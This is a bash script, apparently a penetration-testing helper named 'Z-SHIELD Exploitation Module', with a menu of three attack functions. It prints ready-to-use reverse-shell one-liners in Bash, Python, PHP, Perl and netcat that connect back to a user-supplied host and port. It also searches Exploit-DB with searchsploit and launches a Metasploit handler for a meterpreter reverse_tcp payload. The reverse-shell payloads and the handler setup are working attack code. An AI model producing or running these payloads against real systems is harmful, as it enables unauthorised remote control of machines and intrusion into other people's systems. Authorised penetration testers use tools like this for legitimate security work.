#!/bin/bash

# Z-SHIELD Exploitation Module
# Author: ZAIN NADEEM
# Description: Reverse shell generator, CVE search, and MSF payload launcher

# Colors
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
CYAN="\033[1;36m"
MAGENTA="\033[1;35m"
RESET="\033[0m"
BOLD="\033[1m"

# Table Lines
table_line() {
  printf "${CYAN}+---------------------------+------------------------------------------------+\n"
}

table_row() {
  printf "${CYAN}| %-25s | %-46s |\n" "$1" "$2"
}

# Banner
clear
echo -e "${GREEN}${BOLD}"
figlet -f ANSI_Shadow "EXPLOIT Module" | lolcat
echo -e "${CYAN}${BOLD}         Z-SHIELD Exploitation Module${RESET}"
echo -e "${YELLOW}          Developed by ${RESET}${WHITE}ZAIN NADEEM${RESET}"
echo ""

# Menu
echo -e "${MAGENTA}Select an option:${RESET}"
echo -e "${CYAN}1.${RESET} Generate Reverse Shell"
echo -e "${CYAN}2.${RESET} Search Exploits (searchsploit)"
echo -e "${CYAN}3.${RESET} Launch MSF Payload"
echo -e "${RED}0.${RESET} Return to Main Menu"
echo -ne "\n${YELLOW}Enter your choice: ${RESET}"
read opt

case $opt in
  1)
    clear
    echo -e "${GREEN}${BOLD}Reverse Shell Generator${RESET}"
    echo -e "${CYAN}Available Shells:${RESET}"
    echo -e "${CYAN}1.${RESET} Bash"
    echo -e "${CYAN}2.${RESET} Python"
    echo -e "${CYAN}3.${RESET} PHP"
    echo -e "${CYAN}4.${RESET} Perl"
    echo -e "${CYAN}5.${RESET} Netcat"
    echo -ne "\n${YELLOW}Choose shell type: ${RESET}"
    read shell_type
    echo -ne "${YELLOW}Enter LHOST: ${RESET}"; read lhost
    echo -ne "${YELLOW}Enter LPORT: ${RESET}"; read lport
    echo -e "${GREEN}\nGenerated Reverse Shell:${RESET}"
    echo -e "${CYAN}──────────────────────────────────────────────────────${RESET}"
    case $shell_type in
      1) echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" ;;
      2) echo "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'" ;;
      3) echo "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ;;
      4) echo "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">\&S\");open(STDOUT,\">\&S\");open(STDERR,\">\&S\");exec(\"/bin/sh -i\");};'" ;;
      5) echo "nc -e /bin/bash $lhost $lport" ;;
      *) echo -e "${RED}Invalid choice.${RESET}";;
    esac
    echo -e "${CYAN}──────────────────────────────────────────────────────${RESET}"
    ;;
  2)
    echo -ne "${YELLOW}Enter software/service name or CVE ID: ${RESET}"; read search_term
    echo -e "\n${GREEN}[✓] Searching Exploit-DB for: $search_term${RESET}"
    echo ""
    searchsploit "$search_term" | tee /tmp/zshield_exploit.tmp > /dev/null
    if [ -s /tmp/zshield_exploit.tmp ]; then
      echo -e "${GREEN}Results:${RESET}"
      table_line
      while read -r line; do
        title=$(echo "$line" | cut -d'|' -f1 | xargs)
        path=$(echo "$line" | cut -d'|' -f2 | xargs)
        table_row "$title" "$path"
      done < /tmp/zshield_exploit.tmp
      table_line
    else
      echo -e "${RED}No exploits found.${RESET}"
    fi
    rm -f /tmp/zshield_exploit.tmp
    ;;
  3)
    echo -e "${YELLOW}Launching Metasploit with reverse TCP payload...${RESET}"
    echo -ne "${YELLOW}Enter LHOST: ${RESET}"; read lhost
    echo -ne "${YELLOW}Enter LPORT: ${RESET}"; read lport
    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit"
    ;;
  0)
    echo -e "${CYAN}Returning to main menu...${RESET}"
    sleep 1
    exit 0
    ;;
  *)
    echo -e "${RED}Invalid option.${RESET}"
    ;;
esac
